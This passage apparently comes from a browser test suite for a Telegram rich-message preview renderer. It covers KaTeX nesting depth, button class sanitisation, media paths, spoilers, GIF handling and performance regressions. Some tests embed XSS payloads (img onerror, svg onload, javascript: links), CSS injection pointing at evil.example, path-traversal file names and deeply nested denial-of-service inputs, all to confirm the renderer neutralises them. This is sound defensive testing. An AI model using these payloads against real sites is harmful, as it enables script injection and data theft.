        ].map((rm) => drawn(expr, rm)));
      }, exprs);
      await p.evaluate(() => 1); // the page still answers once it is laid out
      return errors.length ? errors : got;
    } catch (e) {
      return [/** @type {Error} */ (e).message.split('\n')[0]];
    } finally {
      await p.close().catch(() => {});
    }
  };
  const wrong = [];
  for (const [name, make] of Object.entries(kinds)) {
    const got = await draw([make(200), make(30)]);
    const want = [r('error:true,error:true|', 3), r('formula,formula|', 3)].map((s) => s.slice(0, -1).split('|'));
    if (JSON.stringify(got) !== JSON.stringify(want)) wrong.push(`${name}: ${JSON.stringify(got).slice(0, 200)}`);
  }
  check('200 levels of x^{…}, \\sqrt, \\colorbox, \\frac, \\left…\\right, \\begin, \\bgroup draw as an error and do not crash the page; 30 levels draw', wrong.length === 0, wrong.join('; '));
  const edge = await draw([kinds['x^{…}'](64), kinds['x^{…}'](65), '\\{'.repeat(200) + 'x' + '\\}'.repeat(200), '\\leftarrow'.repeat(200)]);
  check('64 levels draw, 65 are too deep; \\{ \\} and \\leftarrow are no levels', JSON.stringify(edge.map((e) => e[0])) === JSON.stringify(['formula,formula', 'error:true,error:true', 'formula,formula', 'formula,formula']), JSON.stringify(edge));
  const macros = await draw([doubled(8), chained(140), doubled(5)]);
  check('levels a formula makes with \\def draw as an error too and do not crash the page', JSON.stringify(macros.map((e) => e[0])) === JSON.stringify(['error:true,error:true', 'error:true,error:true', 'formula,formula']), JSON.stringify(macros).slice(0, 300));
  // groups a % comment hides from the count make no boxes, and their layout grows as the cube of their levels (security
  // review of #230): 600 levels of {\text{v}%} round an x took 3.5 s, 1000 levels 16 s; 1000 of \vbox{%} 28 s. Each is
  // an element in KaTeX's MathML copy, and deeper than it may be there is an error
  const commented = (n) => '{\\text{v}%}\n'.repeat(n) + 'x' + '}'.repeat(n);
  const started = Date.now();
  const hidden = await draw([commented(600), '\\vbox{%}\n'.repeat(1000) + '}'.repeat(1000), commented(30)]);
  const took = Date.now() - started;
  check(`groups a comment hides from the count draw as an error, quickly: ${took} ms`, JSON.stringify(hidden) === JSON.stringify([...Array(2).fill(Array(3).fill('error:true,error:true')), Array(3).fill('formula,formula')]) && took < 5000, JSON.stringify(hidden).slice(0, 300));
  // what is as deep as a formula may be still draws: arrays in arrays, and a long flat one
  const allowed = await draw([kinds['\\begin{matrix}'](63), r('\\begin{array}{c}', 30) + 'y' + r('\\end{array}', 30), r('\\begin{cases}', 30) + 'y' + r('\\end{cases}', 30), r('x^{', 64) + 'y' + r('}', 64), 'a+b'.repeat(10000)]);
  check('arrays in arrays, 64 levels and a long formula still draw', allowed.every((e) => JSON.stringify(e) === JSON.stringify(Array(3).fill('formula,formula'))), JSON.stringify(allowed).slice(0, 300));
}
{
  // a class name made of a string of the post is one word, else there is none (review of #202): «x tg-cell-empty» put
  // the hiding class of tg.css on a button or a row of buttons
  const classes = async (rm, extra) => {
    await render(rm, extra);
    return page.evaluate(() => [...document.querySelectorAll('#out .tg-btn-row, #out .tg-btn')].map((n) => n.className));
  };
  const blocks = await classes({ blocks: [{ type: 'buttons', align: 'c tg-cell-empty', buttons: [{ text: 'a', style: 'x tg-cell-empty', callback_data: 'a' }, { text: 'b', style: 'primary', callback_data: 'b' }] }, { type: 'buttons', align: 'right', buttons: [] }] },
    { reply_markup: { inline_keyboard: [[{ text: 'k', style: 'danger tg-spoiler', callback_data: 'k' }]] } });
  const html = await classes({ html: '<tg-button-row align="c tg-cell-empty"><tg-button data="a">a</tg-button></tg-button-row><tg-button-row align="left"><tg-button data="b">b</tg-button></tg-button-row>' });
  check('blocks and html: align and style of buttons are a class only as one word',
    JSON.stringify(blocks) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn tg-btn-primary', 'tg-btn-row tg-align-right', 'tg-btn'])
    && JSON.stringify(html) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn', 'tg-btn-row tg-align-left', 'tg-btn']), JSON.stringify({ blocks, html }));
  // upload:.. was /media/.., the page itself; a name is one file in the media folder
  const srcs = await page.evaluate(() => ['upload:..', 'upload:.', 'upload:', 'upload:../api/check', 'upload:a/b.png', 'upload:a\\b.png', 'upload:a..b.png', 'upload:a.png']
    .map((m) => RichRender.mediaSrc(m, {})));
  check('upload: a name that is not one file has no preview', JSON.stringify(srcs) === JSON.stringify([null, null, null, null, null, null, '/media/a..b.png', '/media/a.png']), JSON.stringify(srcs));
  // the colour of a button in html is its style attribute, as «В HTML» writes it (issue #206): a word that names a
  // class, never CSS
  const styled = await classes({ html: '<tg-button-row><tg-button data="a" style="primary">a</tg-button><tg-button data="b" style="danger">b</tg-button><tg-button data="c" style="x tg-cell-empty">c</tg-button><tg-button data="d" style="color:red;position:fixed;inset:0;background:url(https://evil.example/b.png)">d</tg-button></tg-button-row>' });
  const css = await page.evaluate(() => [...document.querySelectorAll('#out [style]')].map((n) => n.getAttribute('style')));
  check('html: the style of a button is its colour as one word, not CSS',
    JSON.stringify(styled) === JSON.stringify(['tg-btn-row tg-align-center', 'tg-btn tg-btn-primary', 'tg-btn tg-btn-danger', 'tg-btn', 'tg-btn']) && css.length === 0, JSON.stringify({ styled, css }));
}
{
  // a closed spoiler hides what is in it, a spoiler open inside it too, and a closed spoiler in an open one hides its
  // link, which has a colour of its own (review of #211)
  await render({ html: '<p><tg-spoiler>a <tg-spoiler>b <a href="https://example.com/">ссылка</a></tg-spoiler></tg-spoiler></p>' });
  const seen = await page.evaluate(async () => {
    const [outer, inner] = /** @type {HTMLElement[]} */ ([...document.querySelectorAll('#out .tg-spoiler')]);
    const link = /** @type {HTMLElement} */ (document.querySelector('#out .tg-spoiler a'));
    const got = [];
    for (const [o, i] of [[true, false], [false, true], [false, false], [true, true]]) {
      outer.classList.toggle('tg-spoiler-open', o);
      inner.classList.toggle('tg-spoiler-open', i);
      await new Promise((r) => setTimeout(r, 300)); // a spoiler's transition
      got.push(getComputedStyle(link).visibility);
    }
    return got;
  });
  check('a link in a spoiler in a spoiler is seen only when both are open', JSON.stringify(seen) === JSON.stringify(['hidden', 'hidden', 'hidden', 'visible']), JSON.stringify(seen));
  // an unknown tag in an unknown tag has a frame of its own, from the third level on there is none (issue #198)
  await render({ html: '<tg-x>a<tg-y>b<tg-z>c<tg-w>d</tg-w></tg-z></tg-y></tg-x>' });
  const frames = await page.evaluate(() => [...document.querySelectorAll('#out .tg-unknown')].map((n) => getComputedStyle(n).outlineStyle));
  check('an unknown tag in an unknown tag has its own frame, deeper ones have none', JSON.stringify(frames) === JSON.stringify(['dashed', 'dashed', 'none', 'none']), JSON.stringify(frames));
}
{
  // a formula is its TeX: no tag in it is drawn, in html and in markdown (review of #211). Not in PAYLOADS: KaTeX's
  // MathML for screen readers is a <math> of its own
  const hostile = '<tg-math>a<img src=x onerror="window.__xss=1"><a href="javascript:window.__xss=1">l</a>\\href{javascript:window.__xss=1}{h}</tg-math><tg-math-block><svg onload="window.__xss=1"></svg><img src=x onerror="window.__xss=1">b</tg-math-block>';
  const wrong = [];
  for (const rm of [{ html: hostile }, { markdown: 'Формула ' + hostile }]) {
    const r = await render(rm);
    const got = await page.evaluate(async () => {
      document.querySelectorAll('#out a, #out .tg-math, #out .tg-math-block').forEach((n) => /** @type {HTMLElement} */ (n).click());
      await new Promise((r) => setTimeout(r, 50));
      const outside = [...document.querySelectorAll('#out *')].filter((n) => !n.closest('.katex'));
      return {
        tags: outside.filter((n) => /^(img|a|svg)$/.test(n.localName)).map((n) => n.localName),
        on: [...document.querySelectorAll('#out *')].filter((n) => [...n.attributes].some((a) => /^on/i.test(a.name))).map((n) => n.localName),
        links: document.querySelectorAll('#out a[href]').length,
        formulas: document.querySelectorAll('#out .katex').length,
        xss: window.__xss,
      };
    });
    if (r.xss || got.xss || got.tags.length || got.on.length || got.links || got.formulas !== 2) wrong.push(`${Object.keys(rm)[0]}: ${JSON.stringify(got)}`);
  }
  check('html and markdown: what a formula holds is its TeX, no tag of it is drawn', wrong.length === 0, wrong.join('; '));
}

// ---------- animation (GIF) ----------
{
  // what kind a tg:// file is, its entry in media says: InputMediaAnimation behind a tg://video link is a GIF. A GIF
  // file plays only in <img>; an MP4 animation is a silent looping video. Neither has controls, both have the label.
  const kinds = async (rm) => {
    await render(rm);
    return page.evaluate(() => [...document.querySelectorAll('#out .tg-media')].map((w) => {
      const v = w.querySelector('video');
      return [w.className, w.firstElementChild?.localName, v ? [v.controls, v.autoplay, v.loop, v.muted, v.defaultMuted, v.playsInline].join() : ''];
    }));
  };
  const gif = ['tg-media tg-media-animation tg-gif', 'img', ''];
  const mp4 = ['tg-media tg-media-animation tg-gif', 'video', 'false,true,true,true,true,true'];
  const media = [{ id: 'g', media: { type: 'animation', media: 'upload:a.gif' } }, { id: 'm', media: { type: 'animation', media: 'upload:a.mp4' } },
    { id: 'v', media: { type: 'video', media: 'upload:v.mp4' } }, { id: 'n', media: { type: 'voice_note', media: 'upload:n.ogg' } }];
  const html = await kinds({ html: '<video src="tg://video?id=g"></video><video src="tg://video?id=m"></video><video src="tg://video?id=v"></video><audio src="tg://audio?id=n"></audio>', media });
  check('html: an animation entry behind tg://video is a GIF without controls; a video stays a video, a voice note a voice note',
    JSON.stringify(html) === JSON.stringify([gif, mp4, ['tg-media tg-media-video', 'video', 'true,false,false,true,true,true'], ['tg-media tg-media-voice_note', 'audio', '']]), JSON.stringify(html));
  const blocks = await kinds({ blocks: [{ type: 'animation', animation: { type: 'animation', media: 'upload:a.gif' } }, { type: 'animation', animation: { type: 'animation', media: 'upload:a.mp4' } }] });
  check('blocks: an animation is a GIF without controls too', JSON.stringify(blocks) === JSON.stringify([gif, mp4]), JSON.stringify(blocks));
  const label = await page.evaluate(() => getComputedStyle(/** @type {Element} */ (document.querySelector('#out .tg-gif')), '::before').content);
  check('an animation carries the GIF label', label === '"GIF"', label);
  const ph = await kinds({ html: '<video src="tg://video?id=f"></video>', media: [{ id: 'f', media: { type: 'animation', media: 'CgACAgIAAxkBAAI' } }] });
  check('an animation Telegram already has (file_id) is a GIF placeholder', ph.length === 1 && ph[0][0] === 'tg-media tg-media-animation' && /GIF/.test(await page.evaluate(() => document.querySelector('#out .tg-media-ph')?.textContent || '')), JSON.stringify(ph));
}

// ---------- video / animation muted ----------
{
  await render({ blocks: [{ type: 'animation', animation: { type: 'animation', media: 'upload:a.mp4' } }, { type: 'video', video: { type: 'video', media: 'upload:v.mp4' } }] });
  const m = await page.evaluate(() => [...document.querySelectorAll('#out video')].map((v) => [v.muted, v.defaultMuted]));
  check('video and animation are muted as a property, not only an attribute', m.length === 2 && m.every(([a, b]) => a === true && b === true), JSON.stringify(m));
  await render({ blocks: [{ type: 'slideshow', blocks: [photo('a.png')] }] });
  const one = await page.evaluate(() => { const t = document.querySelector('#out .tg-slides'); return [t.hasAttribute('tabindex'), t.hasAttribute('aria-label')]; });
  check('slideshow of one slide is not focusable and has no arrows hint', !one[0] && !one[1], one.join());
}

// ---------- slow paths (issue #198) ----------
// Not by a fixed limit, which a slow CI runner may miss: by how much the time grows with the input (as
// tests/test_rich_limits.py::test_deep_html_is_checked_in_linear_time) or against the same post drawn a plain way
{
  /** the least of two runs, ms: drawing the post (render), its outline, laying it out on the page once drawn (layout),
   * or copying its code block once laid out (copy) */
  const took = (what, rm) => page.evaluate(([what, rm]) => {
    const out = /** @type {HTMLElement} */ (document.getElementById('out'));
    const once = () => {
      out.replaceChildren();
      out.getBoundingClientRect();
      const drawn = what === 'layout' || what === 'copy' ? RichRender.render({ rich_message: rm }, {}) : null;
      if (drawn && what === 'copy') { out.append(drawn); out.getBoundingClientRect(); }
      const t = performance.now();
      if (what === 'copy') /** @type {HTMLElement} */ (out.querySelector('.tg-pre-copy')).click();
      else if (drawn) { out.append(drawn); out.getBoundingClientRect(); }
      else if (what === 'outline') RichRender.outline({ rich_message: rm });
      else RichRender.render({ rich_message: rm }, {});
      return performance.now() - t;
    };
    const least = Math.min(once(), once());
    out.replaceChildren();
    return least;
  }, [what, rm]);
  const ms = (small, big) => `${small.toFixed(0)} ms → ${big.toFixed(0)} ms`;
  // four times the input takes about four times as long when linear and sixteen when quadratic, on any machine
  const linear = async (name, what, make, n) => {
    const small = await took(what, make(n)), big = await took(what, make(4 * n));
    check(`${name}, four times the input in about four times as long: ${ms(small, big)}`, big < 8 * small + 100);
  };
  // the post drawn a plain way: what the browser itself takes for the same input
  const asPlain = async (name, what, rm, plain, times = 4) => {
    const base = await took(what, plain), t = await took(what, rm);
    check(`${name}, about as long as the same post drawn plainly: ${ms(base, t)}`, t < times * base + 100);
  };

  // a formula inside a formula: walked first, it gave the outer one the text of the inner one as KaTeX drew it, three
  // times longer on every level (12 levels: 52 s). A formula is its TeX, a tag in it is not drawn: what Telegram makes
  // of it is not measured (html-math-nested in tests/telegram_parse/cases.json), so the preview draws the plainest thing
  const formulas = (rm) => page.evaluate((rm) => [...RichRender.render({ rich_message: rm }, {}).querySelectorAll('.tg-math, .tg-math-block')]
    .map((n) => [n.className, n.querySelectorAll('.katex').length, n.querySelector('annotation')?.textContent ?? n.textContent]), rm);
  const nested = '<tg-math>a<tg-math>b<tg-math>c</tg-math></tg-math>d</tg-math>';
  const html = await formulas({ html: `<p>${nested}</p><tg-math-block>x+<tg-math>y</tg-math></tg-math-block>` });
  const md = await formulas({ markdown: `Формула ${nested} и $e$` });
  const ok = JSON.stringify(html) === JSON.stringify([['tg-math', 1, 'abcd'], ['tg-math-block', 1, 'x+y']])
    && JSON.stringify(md) === JSON.stringify([['tg-math', 1, 'abcd'], ['tg-math', 1, 'e']]);
  check('html and markdown: a formula in a formula is one formula of their TeX', ok, JSON.stringify({ html, md }).slice(0, 400));
  // only once the formula is one: otherwise 12 levels hang the page for a minute
  if (ok) {
    await linear('html: formulas in formulas', 'render', (n) => ({ html: '<tg-math>'.repeat(n) + 'x' }), 100);
    await linear('markdown: formulas in formulas', 'render', (n) => ({ markdown: '<tg-math-block>'.repeat(n) + 'x' }), 100);
  } else check('formulas in formulas in linear time', false, 'not run: a formula in a formula is drawn by itself');

  // from every $ a closing one was looked for up to the end of the paragraph: 34 KB of «$1» took 2.7 s on every redraw
  await linear('markdown: a run of $ without a closing one', 'render', (n) => ({ markdown: '$1'.repeat(n) }), 4250);
  await linear('markdown: a run of $ after an unclosed one', 'render', (n) => ({ markdown: '$a' + ' $1'.repeat(n) }), 3000);
  // a code block in a code block is its code, not a box of its own: each moved what was under it into its box (980 ms)
  await asPlain('html: code blocks in code blocks', 'render', { html: '<pre>'.repeat(6000) + 'x' }, { html: '<b>'.repeat(6000) + 'x' });
  const inner = await page.evaluate(() => {
    const body = /** @type {Element} */ (RichRender.render({ rich_message: { html: '<pre><code class="language-js">a<pre>b</pre></code></pre>' } }, {}).querySelector('.tg-body'));
    return [body.querySelectorAll('.tg-pre').length, body.querySelectorAll('pre').length, RichRender.outline({ rich_message: { html: '<pre>a<pre>b</pre></pre>' } })];
  });
  check('html: a code block in a code block has no header of its own', JSON.stringify(inner) === JSON.stringify([1, 2, '<pre>a<pre>b</pre></pre>']), JSON.stringify(inner));
  // a TON address was looked for with closest() from every piece of text, up through all the tags above it
  await asPlain('html: TON addresses in text deep in tags', 'render', { html: '<span>'.repeat(511) + 'a<br>'.repeat(30000) },
    { html: '<span>'.repeat(511) + 'a<br>'.repeat(30000), skip_entity_detection: true }, 2);
  // the number of an item was its place found with indexOf in the whole list, for every item
  await linear('outline: a long numbered list', 'outline', (n) => ({ html: '<ol>' + '<li>a</li>'.repeat(n) + '</ol>' }), 1625);
  // an unknown tag in an unknown tag: every level drew its own dashed frame round each of the 7000 lines (2.3 s of
  // layout), and a closed spoiler in a closed spoiler its own blot under the outer one
  await asPlain('html: unknown tags in unknown tags over many lines', 'layout', { html: '<tg-x>'.repeat(512) + '<br>'.repeat(7000) }, { html: '<b>'.repeat(512) + '<br>'.repeat(7000) });
  await asPlain('html: spoilers in spoilers over many lines', 'layout', { html: '<tg-spoiler>'.repeat(512) + '<br>'.repeat(7000) }, { html: '<b>'.repeat(512) + '<br>'.repeat(7000) });
  // what of the code is in view (issue #206): a range round each <br> was found by its place among the children of the
  // code, from the first one each time; a line that crosses the edge of a box is looked through by halves
  await linear('copy: lines of code from blocks', 'copy', (n) => ({ blocks: [{ type: 'pre', text: 'a b\n'.repeat(n) }] }), 1500);
  await linear('copy: a slide of lines wider than it in code', 'copy', (n) => ({ html: '<pre><tg-slideshow><b>' + ('x'.repeat(60) + '\n').repeat(n) + '</b></tg-slideshow></pre>' }), 150);
  // what is behind a formula was looked up from each formula through all the tags above it (security review of #227)
  const formulasIn = (depth) => ({ html: '<pre>' + '<b>'.repeat(depth) + '<tg-math>x</tg-math>'.repeat(1600) + '</pre>' });
  await asPlain('copy: formulas deep in tags', 'copy', formulasIn(512), formulasIn(1));
  // each piece of text looked through all that formulas paint over text (issue #228): 1600 lines with a fraction each
  // took 0.6 s
  const lines = (formula) => ({ html: '<pre>' + `ab<tg-math>${formula}</tg-math>\n`.repeat(1600) + '</pre>' });
  await asPlain('copy: lines of code with a fraction each', 'copy', lines('\\frac{a}{b}'), lines('a/b'));
}

check('no script ran and no page errors', (await page.evaluate(() => window.__xss)) === 0 && pageErrors.length === 0, pageErrors.join(' | '));
await browser.close();
const failed = results.filter((x) => !x).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
